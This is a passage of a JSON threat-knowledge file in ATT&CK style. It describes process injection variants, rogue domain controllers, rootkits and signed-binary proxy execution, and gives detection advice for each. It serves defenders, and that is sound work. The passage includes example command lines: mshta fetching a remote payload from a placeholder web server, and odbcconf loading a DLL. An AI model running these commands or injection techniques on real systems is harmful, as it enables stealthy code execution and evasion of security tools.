        "description": " \nAdversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.  ",
        "detection": "\nMonitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as CreateRemoteThread, SuspendThread/SetThreadContext/ResumeThread, QueueUserAPC/NtQueueApcThread, and those that can be used to modify memory within another process, such as VirtualAllocEx/WriteProcessMemory, may be used for this technique.  Monitor DLL/PE file events, specifically creation of these binary files as well as the loading of DLLs into processes. Look for DLLs that are not recognized or not normally loaded into a process. Monitoring for Linux specific calls such as the ptrace system call should not generate large amounts of data due to their specialized nature, and can be a very effective method to detect some of the common process injection methods.        Monitor for named pipe creation and connection events (Event IDs 17 and 18) for possible indicators of infected processes with external modules.  Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. \n\n"
      },
      "T1055.001": {
        "name": "Dynamic-link Library Injection",
        "description": " \nAdversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process. \nDLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread. The write can be performed with native Windows API calls such as  VirtualAllocEx and  WriteProcessMemory , then invoked with  CreateRemoteThread (which calls the  LoadLibrary API responsible for loading the DLL).  \n \nVariations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue as well as the additional APIs to invoke execution (since these methods load and execute the files in memory by manually preforming the function of  LoadLibrary ).  \n \n \nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via DLL injection may also evade detection from security products since the execution is masked under a legitimate process.  ",
        "detection": "\nMonitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as CreateRemoteThread and those that can be used to modify memory within another process, such as VirtualAllocEx/WriteProcessMemory, may be used for this technique. Monitor DLL/PE file events, specifically creation of these binary files as well as the loading of DLLs into processes. Look for DLLs that are not recognized or not normally loaded into a process. Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. \n\n"
      },
      "T1055.002": {
        "name": "Portable Executable Injection",
        "description": " \nAdversaries may inject portable executables (PE) into processes in order to evade process-based defenses as well as possibly elevate privileges. PE injection is a method of executing arbitrary code in the address space of a separate live process. \nPE injection is commonly performed by copying code (perhaps without a file on disk) into the virtual address space of the target process before invoking it via a new thread. The write can be performed with native Windows API calls such as  VirtualAllocEx and  WriteProcessMemory , then invoked with  CreateRemoteThread or additional code (ex: shellcode). The displacement of the injected code does introduce the additional requirement for functionality to remap memory references.  \n \nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via PE injection may also evade detection from security products since the execution is masked under a legitimate process.  ",
        "detection": "\nMonitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as CreateRemoteThread and those that can be used to modify memory within another process, such as VirtualAllocEx/WriteProcessMemory, may be used for this technique. Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. \n\n"
      },
      "T1055.003": {
        "name": "Thread Execution Hijacking",
        "description": " \nAdversaries may inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. Thread Execution Hijacking is a method of executing arbitrary code in the address space of a separate live process. \nThread Execution Hijacking is commonly performed by suspending an existing process then unmapping/hollowing its memory, which can then be replaced with malicious code or the path to a DLL. A handle to an existing victim process is first created with native Windows API calls such as  OpenThread . At this point the process can be suspended then written to, realigned to the injected code, and resumed via  SuspendThread ,  VirtualAllocEx ,  WriteProcessMemory ,  SetThreadContext , then  ResumeThread respectively.  \n\nThis is very similar to  Process Hollowing but targets an existing process rather than creating a process in a suspended state. \nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via Thread Execution Hijacking may also evade detection from security products since the execution is masked under a legitimate process.  ",
        "detection": "\nMonitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as CreateRemoteThread, SuspendThread/SetThreadContext/ResumeThread, and those that can be used to modify memory within another process, such as VirtualAllocEx/WriteProcessMemory, may be used for this technique. Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. \n\n"
      },
      "T1055.004": {
        "name": "Asynchronous Procedure Call",
        "description": " \nAdversaries may inject malicious code into processes via the asynchronous procedure call (APC) queue in order to evade process-based defenses as well as possibly elevate privileges. APC injection is a method of executing arbitrary code in the address space of a separate live process. \nAPC injection is commonly performed by attaching malicious code to the APC Queue  \nof a process's thread. Queued APC functions are executed when the thread enters an alterable state.  \nA handle to an existing victim process is first created with native Windows API calls such as  OpenThread . At this point  QueueUserAPC can be used to invoke a function (such as  LoadLibrayA pointing to a malicious DLL). \nA variation of APC injection, dubbed \"Early Bird injection\", involves creating a suspended process in which malicious code can be written and executed before the process' entry point (and potentially subsequent anti-malware hooks) via an APC.  \nAtomBombing  \nis another variation that utilizes APCs to invoke malicious code previously written to the global atom table.  \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via APC injection may also evade detection from security products since the execution is masked under a legitimate process.  ",
        "detection": "\nMonitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as SuspendThread/SetThreadContext/ResumeThread, QueueUserAPC/NtQueueApcThread, and those that can be used to modify memory within another process, such as VirtualAllocEx/WriteProcessMemory, may be used for this technique. Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. \n\n"
      },
      "T1055.005": {
        "name": "Thread Local Storage",
        "description": " \nAdversaries may inject malicious code into processes via thread local storage (TLS) callbacks in order to evade process-based defenses as well as possibly elevate privileges. TLS callback injection is a method of executing arbitrary code in the address space of a separate live process. \nTLS callback injection involves manipulating pointers inside a portable executable (PE) to redirect a process to malicious code before reaching the code's legitimate entry point. TLS callbacks are normally used by the OS to setup and/or cleanup data used by threads. Manipulating TLS callbacks may be performed by allocating and writing to specific offsets within a process’ memory space using other  Process Injection techniques such as  Process Hollowing .  \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via TLS callback injection may also evade detection from security products since the execution is masked under a legitimate process.  ",
        "detection": "\nMonitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as CreateRemoteThread, SuspendThread/SetThreadContext/ResumeThread, and those that can be used to modify memory within another process, such as VirtualAllocEx/WriteProcessMemory, may be used for this technique. Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. \n\n"
      },
      "T1055.008": {
        "name": "Ptrace System Calls",
        "description": " \nAdversaries may inject malicious code into processes via ptrace (process trace) system calls in order to evade process-based defenses as well as possibly elevate privileges. Ptrace system call injection is a method of executing arbitrary code in the address space of a separate live process. \nPtrace system call injection involves attaching to and modifying a running process. The ptrace system call enables a debugging process to observe and control another process (and each individual thread), including changing memory and register values.  \nPtrace system call injection is commonly performed by writing arbitrary code into a running process (ex:  malloc ) then invoking that memory with  PTRACE_SETREGS to set the register containing the next instruction to execute. Ptrace system call injection can also be done with  PTRACE_POKETEXT /  PTRACE_POKEDATA , which copy data to a specific address in the target processes’ memory (ex: the current address of the next instruction).  \n \n \nPtrace system call injection may not be possible targeting processes with high-privileges, and on some system those that are non-child processes.  \n \nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via ptrace system call injection may also evade detection from security products since the execution is masked under a legitimate process.  ",
        "detection": "\nMonitoring for Linux specific calls such as the ptrace system call should not generate large amounts of data due to their specialized nature, and can be a very effective method to detect some of the common process injection methods.        Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. \n\n"
      },
      "T1055.009": {
        "name": "Proc Memory",
        "description": " \nAdversaries may inject malicious code into processes via the /proc filesystem in order to evade process-based defenses as well as possibly elevate privileges. Proc memory injection is a method of executing arbitrary code in the address space of a separate live process. \nProc memory injection involves enumerating the memory of a process via the /proc filesystem (  /proc/[pid] ) then crafting a return-oriented programming (ROP) payload with available gadgets/instructions. Each running process has its own directory, which includes memory mappings. Proc memory injection is commonly performed by overwriting the target processes’ stack using memory mappings provided by the /proc filesystem. This information can be used to enumerate offsets (including the stack) and gadgets (or instructions within the program that can be used to build a malicious payload) otherwise hidden by process memory protections such as address space layout randomization (ASLR). Once enumerated, the target processes’ memory map within  /proc/[pid]/maps can be overwritten using dd.  \n \n \n \nOther techniques such as  LD_PRELOAD may be used to populate a target process with more available gadgets. Similar to  Process Hollowing , proc memory injection may target child processes (such as a backgrounded copy of sleep).  \n \nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via proc memory injection may also evade detection from security products since the execution is masked under a legitimate process.  ",
        "detection": "\nFile system monitoring can determine if /proc files are being modified. Users should not have permission to modify these in most cases. Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. \n\n"
      },
      "T1055.011": {
        "name": "Extra Window Memory Injection",
        "description": " \nAdversaries may inject malicious code into process via Extra Window Memory (EWM) in order to evade process-based defenses as well as possibly elevate privileges. EWM injection is a method of executing arbitrary code in the address space of a separate live process. \nBefore creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data).  \nRegistration of new windows classes can include a request for up to 40 bytes of EWM to be appended to the allocated memory of each instance of that class. This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value.  \n  \n\nAlthough small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure. Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process’s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process’s EWM. \nExecution granted through EWM injection may allow access to both the target process's memory and possibly elevated privileges. Writing payloads to shared sections also avoids the use of highly monitored API calls such as  WriteProcessMemory and  CreateRemoteThread .  \nMore sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention (DEP) by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process.  \n  \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via EWM injection may also evade detection from security products since the execution is masked under a legitimate process.  ",
        "detection": "\nMonitor for API calls related to enumerating and manipulating EWM such as GetWindowLong   and SetWindowLong  . Malware associated with this technique have also used SendNotifyMessage   to trigger the associated window procedure and eventual malicious injection.  \n\n"
      },
      "T1055.012": {
        "name": "Process Hollowing",
        "description": " \nAdversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. Process hollowing is a method of executing arbitrary code in the address space of a separate live process. \nProcess hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code. A victim process can be created with native Windows API calls such as  CreateProcess , which includes a flag to suspend the processes primary thread. At this point the process can be unmapped using APIs calls such as  ZwUnmapViewOfSection or  NtUnmapViewOfSection before being written to, realigned to the injected code, and resumed via  VirtualAllocEx ,  WriteProcessMemory ,  SetThreadContext , then  ResumeThread respectively.  \n \n\nThis is very similar to  Thread Local Storage but creates a new process rather than targeting an existing process. This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process hollowing may also evade detection from security products since the execution is masked under a legitimate process.  ",
        "detection": "\nMonitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as CreateRemoteThread, SuspendThread/SetThreadContext/ResumeThread, and those that can be used to modify memory within another process, such as VirtualAllocEx/WriteProcessMemory, may be used for this technique. Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. \n\n"
      },
      "T1055.013": {
        "name": "Process Doppelgänging",
        "description": " \nAdversaries may inject malicious code into process via process doppelgänging in order to evade process-based defenses as well as possibly elevate privileges. Process doppelgänging is a method of executing arbitrary code in the address space of a separate live process. \nWindows Transactional NTFS (TxF) was introduced in Vista as a method to perform safe file operations.  \nTo ensure data integrity, TxF enables only one transacted handle to write to a file at a given time. Until the write handle transaction is terminated, all other handles are isolated from the writer and may only read the committed version of the file that existed at the time the handle was opened.  \nTo avoid corruption, TxF performs an automatic rollback if the system or application fails during a write transaction.  \n\nAlthough deprecated, the TxF application programming interface (API) is still enabled as of Windows 10.  \n\nAdversaries may abuse TxF to a perform a file-less variation of  Process Injection . Similar to  Process Hollowing , process doppelgänging involves replacing the memory of a legitimate process, enabling the veiled execution of malicious code that may evade defenses and detection. Process doppelgänging's use of TxF also avoids the use of highly-monitored API functions such as  NtUnmapViewOfSection ,  VirtualProtectEx , and  SetThreadContext .  \n\nProcess Doppelgänging is implemented in 4 steps  \n: Transact – Create a TxF transaction using a legitimate executable then overwrite the file with malicious code. These changes will be isolated and only visible within the context of the transaction. Load – Create a shared section of memory and load the malicious executable. Rollback – Undo changes to original executable, effectively removing malicious code from the file system. Animate – Create a process from the tainted section of memory and initiate execution. \nThis behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process doppelgänging may evade detection from security products since the execution is masked under a legitimate process.  ",
        "detection": "\nMonitor and analyze calls to CreateTransaction, CreateFileTransacted, RollbackTransaction, and other rarely used functions indicative of TxF activity. Process Doppelgänging also invokes an outdated and undocumented implementation of the Windows process loader via calls to NtCreateProcessEx and NtCreateThreadEx as well as API calls used to modify memory within another process, such as WriteProcessMemory.    Scan file objects reported during the PsSetCreateProcessNotifyRoutine,   which triggers a callback whenever a process is created or deleted, specifically looking for file objects with enabled write access.   Also consider comparing file objects loaded in memory to the corresponding file on disk.  Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior.\n\n"
      },
      "T1055.014": {
        "name": "VDSO Hijacking",
        "description": " \nAdversaries may inject malicious code into processes via VDSO hijacking in order to evade process-based defenses as well as possibly elevate privileges. Virtual dynamic shared object (vdso) hijacking is a method of executing arbitrary code in the address space of a separate live process. \nVDSO hijacking involves redirecting calls to dynamically linked shared libraries. Memory protections may prevent writing executable code to a process via  Ptrace System Calls . However, an adversary may hijack the syscall interface code stubs mapped into a process from the vdso shared object to execute syscalls to open and map a malicious shared object. This code can then be invoked by redirecting the execution flow of the process via patched memory address references stored in a process' global offset table (which store absolute addresses of mapped library functions).  \n  \n  \n  \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via VDSO hijacking may also evade detection from security products since the execution is masked under a legitimate process.  ",
        "detection": "\nMonitor for malicious usage of system calls, such as ptrace and mmap, that can be used to attach to, manipulate memory, then redirect a processes' execution path. Monitoring for Linux specific calls such as the ptrace system call should not generate large amounts of data due to their specialized nature, and can be a very effective method to detect some of the common process injection methods.        Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. \n\n"
      },
      "T1207": {
        "name": "Rogue Domain Controller",
        "description": " \nAdversaries may register a rogue Domain Controller to enable manipulation of Active Directory data. DCShadow may be used to create a rogue Domain Controller (DC). DCShadow is a method of manipulating Active Directory (AD) data, including objects and schemas, by registering (or reusing an inactive registration) and simulating the behavior of a DC.  \nOnce registered, a rogue DC may be able to inject and replicate changes into AD infrastructure for any domain object, including credentials and keys. \nRegistering a rogue DC involves creating a new server and nTDSDSA objects in the Configuration partition of the AD schema, which requires Administrator privileges (either Domain or local to the DC) or the KRBTGT hash.  \n\nThis technique may bypass system logging and security monitors such as security information and event management (SIEM) products (since actions taken on a rogue DC may not be reported to these sensors).  \nThe technique may also be used to alter and delete replication and other associated metadata to obstruct forensic analysis. Adversaries may also utilize this technique to perform  SID-History Injection and/or manipulate AD objects (such as accounts, access control lists, schemas) to establish backdoors for Persistence.  \n ",
        "detection": "\nMonitor and analyze network traffic associated with data replication (such as calls to DrsAddEntry, DrsReplicaAdd, and especially GetNCChanges) between DCs as well as to/from non DC hosts.     DC replication will naturally take place every 15 minutes but can be triggered by an attacker or by legitimate urgent changes (ex: passwords). Also consider monitoring and alerting on the replication of AD objects (Audit Detailed Directory Service Replication Events 4928 and 4929).  Leverage AD directory synchronization (DirSync) to monitor changes to directory state using AD replication cookies.    Baseline and periodically analyze the Configuration partition of the AD schema and alert on creation of nTDSDSA objects.  Investigate usage of Kerberos Service Principal Names (SPNs), especially those associated with services (beginning with \"GC/\") by computers not present in the DC organizational unit (OU). The SPN associated with the Directory Replication Service (DRS) Remote Protocol interface (GUID E3514235–4B06–11D1-AB04–00C04FC2DCD2) can be set without logging.   A rogue DC must authenticate as a service using these two SPNs for the replication process to successfully complete.\n\n"
      },
      "T1014": {
        "name": "Rootkit",
        "description": " \nAdversaries may use rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components. Rootkits are programs that hide the existence of malware by intercepting/hooking and modifying operating system API calls that supply system information.  \n \nRootkits or rootkit enabling functionality may reside at the user or kernel level in the operating system or lower, to include a hypervisor, Master Boot Record, or  System Firmware .  \nRootkits have been seen for Windows, Linux, and Mac OS X systems.  \n  \n ",
        "detection": "\nSome rootkit protections may be built into anti-virus or operating system software. There are dedicated rootkit detection tools that look for specific types of rootkit behavior. Monitor for the existence of unrecognized DLLs, devices, services, and changes to the MBR.  \n\n"
      },
      "T1218": {
        "name": "Signed Binary Proxy Execution",
        "description": " \nAdversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed binaries. Binaries signed with trusted digital certificates can execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files.  ",
        "detection": "\nMonitor processes and command-line parameters for signed binaries that may be used to proxy execution of malicious files. Compare recent invocations of signed binaries that may be used to proxy execution with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity. Legitimate programs used in suspicious ways, like msiexec.exe downloading an MSI file from the Internet, may be indicative of an intrusion. Correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.Monitor for file activity (creations, downloads, modifications, etc.), especially for file types that are not typical within an environment and may be indicative of adversary activity.\n\n\n\n\n\n\n\n\n\n\n"
      },
      "T1218.001": {
        "name": "Compiled HTML File",
        "description": " \nAdversaries may abuse Compiled HTML files (.chm) to conceal malicious code. CHM files are commonly distributed as part of the Microsoft HTML Help system. CHM files are compressed compilations of various content such as HTML documents, images, and scripting/web related programming languages such VBA, JScript, Java, and ActiveX.  \nCHM content is displayed using underlying components of the Internet Explorer browser  \nloaded by the HTML Help executable program (hh.exe).  \n\nA custom CHM file containing embedded payloads could be delivered to a victim then triggered by  User Execution . CHM execution may also bypass application application control on older and/or unpatched systems that do not account for execution of binaries through hh.exe.  \n  \n ",
        "detection": "\nMonitor and analyze the execution and arguments of hh.exe.   Compare recent invocations of hh.exe with prior history of known good arguments to determine anomalous and potentially adversarial activity (ex: obfuscated and/or malicious commands). Non-standard process execution trees may also indicate suspicious or malicious behavior, such as if hh.exe is the parent process for suspicious processes and activity relating to other adversarial techniques.Monitor presence and use of CHM files, especially if they are not typically used within an environment.\n\n"
      },
      "T1218.002": {
        "name": "Control Panel",
        "description": " \nAdversaries may abuse control.exe to proxy execution of malicious payloads. The Windows Control Panel process binary (control.exe) handles execution of Control Panel items, which are utilities that allow users to view and adjust computer settings. \nControl Panel items are registered executable (.exe) or Control Panel (.cpl) files, the latter are actually renamed dynamic-link library (.dll) files that export a  CPlApplet function.  \n \nFor ease of use, Control Panel items typically include graphical menus available to users after being registered and loaded into the Control Panel.  \nControl Panel items can be executed directly from the command line, programmatically via an application programming interface (API) call, or by simply double-clicking the file.  \n  \n \n\nMalicious Control Panel items can be delivered via  Phishing campaigns  \n \nor executed as part of multi-stage malware.  \nControl Panel items, specifically CPL files, may also bypass application and/or file extension allow lists. \nAdversaries may also rename malicious DLL files (.dll) with Control Panel file extensions (.cpl) and register them to  HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Control Panel\\Cpls . Even when these registered DLLs do not comply with the CPL file specification and do not export  CPlApplet functions, they are loaded and executed through its  DllEntryPoint when Control Panel is executed. CPL files not exporting  CPlApplet are not directly executable.  \n ",
        "detection": "\nMonitor and analyze activity related to items associated with CPL files, such as the control.exe and the Control_RunDLL and ControlRunDLLAsUser API functions in shell32.dll. When executed from the command line or clicked, control.exe will execute the CPL file (ex: control.exe file.cpl) before Rundll32 is used to call the CPL's API functions (ex: rundll32.exe shell32.dll,Control_RunDLL file.cpl). CPL files can be executed directly via the CPL API function with just the latter Rundll32 command, which may bypass detections and/or execution filters for control.exe. Inventory Control Panel items to locate unregistered and potentially malicious files present on systems:Executable format registered Control Panel items will have a globally unique identifier (GUID) and registration Registry entries in HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ControlPanel\\NameSpace and HKEY_CLASSES_ROOT\\CLSID{{GUID}}. These entries may contain information about the Control Panel item such as its display name, path to the local file, and the command executed when opened in the Control Panel.  CPL format registered Control Panel items stored in the System32 directory are automatically shown in the Control Panel. Other Control Panel items will have registration entries in the CPLs and Extended Properties Registry keys of HKEY_LOCAL_MACHINE or HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Control Panel. These entries may include information such as a GUID, path to the local file, and a canonical name used to launch the file programmatically ( WinExec(\"c:\\windows\\system32\\control.exe {{Canonical_Name}}\", SW_NORMAL);) or from a command line (control.exe /name {{Canonical_Name}}). Some Control Panel items are extensible via Shell extensions registered in HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Controls Folder{{name}}\\Shellex\\PropertySheetHandlers where {{name}} is the predefined name of the system item. Analyze new Control Panel items as well as those present on disk for malicious content. Both executable and CPL formats are compliant Portable Executable (PE) images and can be examined using traditional tools and methods, pending anti-reverse-engineering techniques. \n\n"
      },
      "T1218.003": {
        "name": "CMSTP",
        "description": " \nAdversaries may abuse CMSTP to proxy execution of malicious code. The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles.  \nCMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections. \nAdversaries may supply CMSTP.exe with INF files infected with malicious commands.  \nSimilar to  Regsvr32 / \"Squiblydoo\", CMSTP.exe may be abused to load and execute DLLs  \nand/or COM scriptlets (SCT) from remote servers.  \n  \n  \nThis execution may also bypass AppLocker and other application control defenses since CMSTP.exe is a legitimate, signed Microsoft application. \nCMSTP.exe can also be abused to  Bypass User Account Control and execute arbitrary commands from a malicious INF through an auto-elevated COM interface.  \n  \n  \n ",
        "detection": "\nUse process monitoring to detect and analyze the execution and arguments of CMSTP.exe. Compare recent invocations of CMSTP.exe with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity.Sysmon events can also be used to identify potential abuses of CMSTP.exe. Detection strategy may depend on the specific adversary procedure, but potential rules include:  To detect loading and execution of local/remote payloads - Event 1 (Process creation) where ParentImage contains CMSTP.exe and/or Event 3 (Network connection) where Image contains CMSTP.exe and DestinationIP is external.To detect Bypass User Account Control via an auto-elevated COM interface - Event 10 (ProcessAccess) where CallTrace contains CMLUA.dll and/or Event 12 or 13 (RegistryEvent) where TargetObject contains CMMGR32.exe. Also monitor for events, such as the creation of processes (Sysmon Event 1), that involve auto-elevated CMSTP COM interfaces such as CMSTPLUA (3E5FC7F9-9A51-4367-9063-A120244FBEC7) and CMLUAUTIL (3E000D72-A845-4CD9-BD83-80C07C3B881F).\n\n"
      },
      "T1218.004": {
        "name": "InstallUtil",
        "description": " \nAdversaries may use InstallUtil to proxy execution of code through a trusted Windows utility. InstallUtil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries.  \nInstallUtil is digitally signed by Microsoft and located in the .NET directories on a Windows system:  C:\\Windows\\Microsoft.NET\\Framework\\v \\InstallUtil.exe and  C:\\Windows\\Microsoft.NET\\Framework64\\v \\InstallUtil.exe . \nInstallUtil may also be used to bypass application control through use of attributes within the binary that execute the class decorated with the attribute  [System.ComponentModel.RunInstaller(true)] .  \n ",
        "detection": "\nUse process monitoring to monitor the execution and arguments of InstallUtil.exe. Compare recent invocations of InstallUtil.exe with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. Command arguments used before and after the InstallUtil.exe invocation may also be useful in determining the origin and purpose of the binary being executed.\n\n"
      },
      "T1218.005": {
        "name": "Mshta",
        "description": " \nAdversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code  \n  \n  \n  \n  \n \nMshta.exe is a utility that executes Microsoft HTML Applications (HTA) files.  \nHTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser.  \n\nFiles may be executed by mshta.exe through an inline script:  mshta vbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\")) \nThey may also be executed directly from URLs:  mshta http[:]//webserver/payload[.]hta \nMshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings.  \n ",
        "detection": "\nUse process monitoring to monitor the execution and arguments of mshta.exe. Look for mshta.exe executing raw or obfuscated script within the command-line. Compare recent invocations of mshta.exe with prior history of known good arguments and executed .hta files to determine anomalous and potentially adversarial activity. Command arguments used before and after the mshta.exe invocation may also be useful in determining the origin and purpose of the .hta file being executed.Monitor use of HTA files. If they are not typically used within an environment then execution of them may be suspicious\n\n"
      },
      "T1218.007": {
        "name": "Msiexec",
        "description": " \nAdversaries may abuse msiexec.exe to proxy execution of malicious payloads. Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi).  \nMsiexec.exe is digitally signed by Microsoft. \nAdversaries may abuse msiexec.exe to launch local or network accessible MSI files. Msiexec.exe can also execute DLLs.  \n \nSince it is signed and native on Windows systems, msiexec.exe can be used to bypass application control solutions that do not account for its potential abuse.  ",
        "detection": "\nUse process monitoring to monitor the execution and arguments of msiexec.exe. Compare recent invocations of msiexec.exe with prior history of known good arguments and executed MSI files or DLLs to determine anomalous and potentially adversarial activity. Command arguments used before and after the invocation of msiexec.exe may also be useful in determining the origin and purpose of the MSI files or DLLs being executed.\n\n"
      },
      "T1218.008": {
        "name": "Odbcconf",
        "description": " \nAdversaries may abuse odbcconf.exe to proxy execution of malicious payloads. Odbcconf.exe is a Windows utility that allows you to configure Open Database Connectivity (ODBC) drivers and data source names.  \nOdbcconf.exe is digitally signed by Microsoft. \nAdversaries may abuse odbcconf.exe to bypass application control solutions that do not account for its potential abuse. Similar to  Regsvr32 , odbcconf.exe has a  REGSVR flag that can be misused to execute DLLs (ex:  odbcconf.exe /S /A &lbraceREGSVR \"C:\\Users\\Public\\file.dll\"&rbrace ).  \n \n \n  ",
        "detection": "\nUse process monitoring to monitor the execution and arguments of odbcconf.exe. Compare recent invocations of odbcconf.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity. Command arguments used before and after the invocation of odbcconf.exe may also be useful in determining the origin and purpose of the DLL being loaded.\n\n"
      },
      "T1218.009": {
        "name": "Regsvcs/Regasm",
        "description": " \nAdversaries may abuse Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. Regsvcs and Regasm are Windows command-line utilities that are used to register .NET  Component Object Model (COM) assemblies. Both are digitally signed by Microsoft.  \n  \n\nBoth utilities may be used to bypass application control through use of attributes within the binary to specify code that should be run before registration or unregistration:  [ComRegisterFunction] or  [ComUnregisterFunction] respectively. The code with the registration and unregistration attributes will be executed even if the process is run under insufficient privileges and fails to execute.  \n \n ",
        "detection": "\nUse process monitoring to monitor the execution and arguments of Regsvcs.exe and Regasm.exe. Compare recent invocations of Regsvcs.exe and Regasm.exe with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. Command arguments used before and after Regsvcs.exe or Regasm.exe invocation may also be useful in determining the origin and purpose of the binary being executed.\n\n"
      },
      "T1218.010": {
        "name": "Regsvr32",
